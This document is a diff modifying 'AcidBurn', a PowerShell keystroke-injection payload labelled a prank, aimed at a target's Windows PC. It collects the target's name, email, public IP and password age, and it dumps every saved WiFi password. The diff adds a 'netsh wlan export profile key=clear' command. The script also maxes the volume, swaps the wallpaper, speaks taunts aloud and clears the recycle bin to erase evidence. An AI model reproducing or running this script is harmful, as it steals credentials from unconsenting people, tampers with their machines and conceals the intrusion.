@@ -1,33 +1,6 @@
-############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : AcidBurn          | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
-# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
-# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
-#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby        (youtube link with demonstration coming soon)                              #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
-############################################################################################################################################################
-
-<#
-.NOTES
-	This script was not optimized to shorten the code. This script is intended to have as much readability as possible for new coders to learn.
-
-.DESCRIPTION 
-	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
-	The SSID and WiFi password of any current or previously connected to networks.
-	It determines the last day they changed their password and how many days ago.
-	Once the information is gathered the script will pause until a mouse movement is detected
-	Then the script uses Sapi speak to roast their set up and lack of security
-#>
+#
+# Original script made by I-Am-Jakoby // I only modified the parts that did not work for me to get all of the functions to operate. 
+#
 ############################################################################################################################################################
 
 # Variables
@@ -38,11 +11,13 @@ $s=New-Object -ComObject SAPI.SpVoice
 ############################################################################################################################################################
 
 # Intro ---------------------------------------------------------------------------------------------------
+# 0D1nss0n ---- had to update -Pattern "Full Name" to -Pattern "User Name" as no machine I tested had any value in the "Full Name" section. 
+
  function Get-fullName {
 
     try {
 
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+    $fullName = Net User $Env:username | Select-String -Pattern "User Name";$fullName = ("$fullName").TrimStart("User Name")
 
     }
  
@@ -66,7 +41,6 @@ echo "Intro Done"
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	RAM Info
 	This will get the amount of RAM the target computer has
@@ -85,11 +59,11 @@ function Get-RAM {
 
 # ENTER YOUR CUSTOM RESPONSES HERE
 #----------------------------------------------------------------------------------------------------
-    $lowRAM = "$RAM gigs of ram? might as well use pen and paper"
+    $lowRAM = "$RAM gigs of ram? really? What is this, 1999? Give me a break...."
     
-    $okRAM = "$RAM gigs of ram really? I have a calculator with more computing power"
+    $okRAM = "$RAM gigs of ram? My phone has more memory than this piece of junk you call a PC..."
     
-    $goodRAM = "$RAM gigs of ram? Can almost guarantee you have a light up keyboard.. you are a wanna be streamer huh?"
+    $goodRAM = "$RAM gigs of ram? I bet you have a light up keyboard and a bucket seat gaming chair... you're a wannabe streamer huh?...."
 
     $impressiveRAM = "$RAM gigs of ram? are you serious? a super computer with no security that is funny right there"
 #----------------------------------------------------------------------------------------------------
@@ -121,7 +95,6 @@ echo "RAM Info Done"
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	Public IP 
 	This will get the public IP from the target computer
@@ -153,7 +126,6 @@ echo "Pub IP Done"
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	Wifi Network and Password
 	This function will custom a tailor response based on how many characters long their password is
@@ -218,7 +190,6 @@ echo "Wifi pass Done"
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	All Wifi Networks and Passwords 
 	This function will gather all current Networks and Passwords saved on the target computer
@@ -276,7 +247,6 @@ $w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
 $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
 
 <#
-
 .NOTES 
 	This will take the image you generated and set it as the targets wall paper
 #>
@@ -360,6 +330,13 @@ public class Params
 
 #############################################################################################################################################
 
+cd $env:temp\
+netsh wlan export profile key=clear
+Select-String -Path Wi*.xml -Pattern 'keyMaterial' > wifipass.txt
+
+
+#############################################################################################################################################
+
 Function WallPaper-Troll {
 
 if (!$Networks) { Write-Host "variable is null" 
@@ -367,7 +344,7 @@ if (!$Networks) { Write-Host "variable is null"
 
 	# This is the name of the file the networks and passwords are saved 
 
-	$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
+	$FileName = "wifipass.txt"
 
 	($Networks| Out-String) >> $Env:temp\$FileName
 
@@ -376,14 +353,13 @@ if (!$Networks) { Write-Host "variable is null"
 
 # this is the message that will be coded into the image you use as the wallpaper
 
-	$hiddenMessage = "`n`nMy crime is that of curiosity `nand you're not a total n3wb for being able to find this message.... Kudos..."
+	$hiddenMessage = "`n`nGet Wrecked`n"
 
 # this will be the name of the image you use as the wallpaper
 
-	$ImageName = "dont-be-suspicious"
+	$ImageName = "hey $fullName"
 
 <#
-
 .NOTES  
 	This will get take the information gathered and format it into a .jpg
 #>
@@ -393,8 +369,8 @@ if (!$Networks) { Write-Host "variable is null"
 	$filename = "$env:tmp\foo.jpg" 
 	$bmp = new-object System.Drawing.Bitmap $w,$h 
 	$font = new-object System.Drawing.Font Consolas,18 
-	$brushBg = [System.Drawing.Brushes]::White 
-	$brushFg = [System.Drawing.Brushes]::Black 
+	$brushBg = [System.Drawing.Brushes]::Black 
+	$brushFg = [System.Drawing.Brushes]::Lime 
 	$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
 	$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
 	$graphics.DrawString($content,$font,$brushFg,500,100) 
@@ -404,7 +380,6 @@ if (!$Networks) { Write-Host "variable is null"
 # Invoke-Item $filename 
 
 <#
-
 .NOTES 
 	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
 	Then it will clean up the files you don't want to leave behind
@@ -440,7 +415,6 @@ echo "All Wifi Passes Done"
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	Password last Set
 	This function will custom tailor a response based on how long it has been since they last changed their password
@@ -464,7 +438,7 @@ echo "All Wifi Passes Done"
     $days = [int]$DateArray[0]
     }
  
- # If no password set date is detected function will return $null to cancel Sapi Speak
+ # If no password set date is detected funtion will return $null to cancel Sapi Speak
 
     # Write Error is just for troubleshooting 
     catch {Write-Error "Day password set not found" 
@@ -497,7 +471,6 @@ echo "Pass last set Done"
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	Get Email
 	This function will custom tailor a response based on what type of email the target has
@@ -548,13 +521,12 @@ echo "Email Done"
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	Messages
 	This function will run all the previous functions and assign their outputs to variables
 #>
 
-$intro = "Hello, it has been a long time my friend"
+$intro = "$fullName , it has been a long time my friend"
 
 $RAMwarn = Get-RAM  
 
@@ -566,7 +538,7 @@ $LAST_PASSwarn =  Get-Days_Set
 
 $EMAILwarn = Get-email 
 
-$OUTRO =  "My crime is that of curiosity.... 	and your's is that of needing better security protocols.... later nerd..."
+$OUTRO =  "My crime is that of curiosity.... 	and yours is that of needing better security protocols... later $fullName"
 
 # echo statement used to track progress while debugging
 echo "Speak Variables set"
@@ -575,7 +547,7 @@ echo "Speak Variables set"
 
 # This turns the volume up to max level--------------------------------------------------------------------
 
-#$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 
 # echo statement used to track progress while debugging
 echo "Volume to max level"
@@ -583,7 +555,6 @@ echo "Volume to max level"
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	These two snippets are meant to be used as indicators to let you know the script is set up and ready
 	This will display a pop up window saying "hello $fullname"
@@ -593,7 +564,7 @@ echo "Volume to max level"
 
 # a popup will be displayed before freezing the script while waiting for the cursor to move to continue the script
 # else capslock light will blink as an indicator
-$popmessage = "Hello Friend"
+$popmessage = "Hello $fullName"
 
 
 $readyNotice = New-Object -ComObject Wscript.Shell;$readyNotice.Popup($popmessage)
@@ -607,14 +578,13 @@ $blinks = 3;$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $bli
 #-----------------------------------------------------------------------------------------------------------
 
 <#
-
 .NOTES 
 	Then the script will be paused until the mouse is moved 
 	script will check mouse position every indicated number of seconds
 	This while loop will constantly check if the mouse has been moved 
-	"CAPSLOCK" will be continuously pressed to prevent screen from turning off
+	"CAPSLOCK" will be continously pressed to prevent screen from turning off
 	it will then sleep for the indicated number of seconds and check again
-	when mouse is moved it will break out of the loop and continue the script
+	when mouse is moved it will break out of the loop and continue theipt
 #>
 
 
@@ -662,13 +632,12 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-$message = "`nMy crime is that of curiosity `nNow get to work on fixing your security issues..."
+$message = "`nMy crime is that of curiosity`nNow work on getting better with your security practices"
 
-Add-Content $home\Desktop\LaterNerd.txt $message
+Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
 
 <#
-
 .NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
@@ -691,7 +660,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
 
-# This script repeatedly presses the capslock button, this snippet will make sure capslock is turned back off
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
 
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
